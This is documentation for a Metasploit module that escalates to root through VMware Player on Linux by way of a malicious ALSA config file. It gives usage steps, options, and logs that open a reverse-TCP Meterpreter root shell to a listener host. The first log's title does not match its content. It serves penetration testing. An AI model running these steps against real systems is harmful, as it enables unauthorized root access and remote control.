## Description

  This module exploits a vulnerability in VMware Workstation Pro and
  Player on Linux which allows users to escalate their privileges by
  using an ALSA configuration file to load and execute a shared object
  as `root` when launching a virtual machine with an attached sound card.


## Vulnerable Application

  VMware Workstation Pro and VMware Workstation Player are the industry
  standard for running multiple operating systems as virtual machines on
  a single PC. Thousands of IT professionals, developers and businesses
  use Workstation Pro and Workstation Player to be more agile, more
  productive and more secure every day.

  This module has been tested successfully on:

  * VMware Player version 12.5.0 on Debian Linux 8 Jessie


## Verification Steps

  1. Start `msfconsole`
  2. Get a session
  3. Do: `use exploit/linux/local/vmware_alsa_config`
  4. Do: `set SESSION [SESSION]`
  5. Do: `check`
  6. Do: `run`
  7. You should get a new `root` session


## Options

  **SESSION**

  Which session to use, which can be viewed with `sessions`

  **WritableDir**

  A writable directory file system path. (default: `/tmp`)

  **Xdisplay**

  Display exploit will attempt to use (default: `:0`)


## Scenarios

### Command Shell Session - VMware Player 12.5.0 (Debian 8 Jessie)

  ```
  msf5 > use exploit/linux/local/vmware_alsa_config 
  msf5 exploit(linux/local/vmware_alsa_config) > set lhost 172.16.191.188
  lhost => 172.16.191.188
  msf5 exploit(linux/local/vmware_alsa_config) > set session 1
  session => 1
  msf5 exploit(linux/local/vmware_alsa_config) > run

  [*] Started reverse TCP handler on 172.16.191.188:4444 
  [*] Writing '/tmp/pSvQHD5S5fh/afLaYVIoUm.so.c' (526 bytes) ...
  [*] Writing '/tmp/pSvQHD5S5fh/pSvQHD5S5fh.vmx' (560 bytes) ...
  [*] Writing '/tmp/pSvQHD5S5fh/jl7XmpZWdE' (964720 bytes) ...
  [*] Writing '/home/user/.asoundrc' (116 bytes) ...
  [*] Launching VMware Player...
  [*] Meterpreter session 2 opened (172.16.191.188:4444 -> 172.16.191.208:57796) at 2018-12-17 02:43:22 -0500
  [+] Deleted /home/user/.asoundrc
  [+] Deleted /home/user/Desktop/~/.vmware/preferences
  [!] Attempting to delete working directory /tmp/pSvQHD5S5fh
  [-] Exploit failed: negative array size (or size too big)

  meterpreter > getuid
  Server username: uid=0, gid=0, euid=0, egid=0
  meterpreter > sysinfo
  Computer     : 172.16.191.208
  OS           : Debian 8.8 (Linux 3.16.0-4-amd64)
  Architecture : x64
  BuildTuple   : x86_64-linux-musl
  Meterpreter  : x64/linux
  meterpreter > 
  ```

### Meterpreter Session - VMware Player 12.5.0 (Debian 8 Jessie)

  ```
  msf5 > use exploit/linux/local/vmware_alsa_config 
  msf5 exploit(linux/local/vmware_alsa_config) > set lhost 172.16.191.188
  lhost => 172.16.191.188
  msf5 exploit(linux/local/vmware_alsa_config) > set session 1
  session => 1
  msf5 exploit(linux/local/vmware_alsa_config) > run

  [*] Started reverse TCP handler on 172.16.191.188:4444 
  [*] Writing '/tmp/5irkXF31Iw/GHAPsWBkjix.so.c' (527 bytes) ...
  [*] Writing '/tmp/5irkXF31Iw/5irkXF31Iw.vmx' (558 bytes) ...
  [*] Writing '/tmp/5irkXF31Iw/Rxqj9taEcXol' (964720 bytes) ...
  [*] Writing '/home/user/.asoundrc' (116 bytes) ...
  [*] Launching VMware Player...
  [*] Meterpreter session 2 opened (172.16.191.188:4444 -> 172.16.191.208:57799) at 2018-12-17 02:46:39 -0500

  meterpreter > getuid
  Server username: uid=0, gid=0, euid=0, egid=0
  meterpreter > sysinfo
  Computer     : 172.16.191.208
  OS           : Debian 8.8 (Linux 3.16.0-4-amd64)
  Architecture : x64
  BuildTuple   : x86_64-linux-musl
  Meterpreter  : x64/linux
  meterpreter > 
  ```

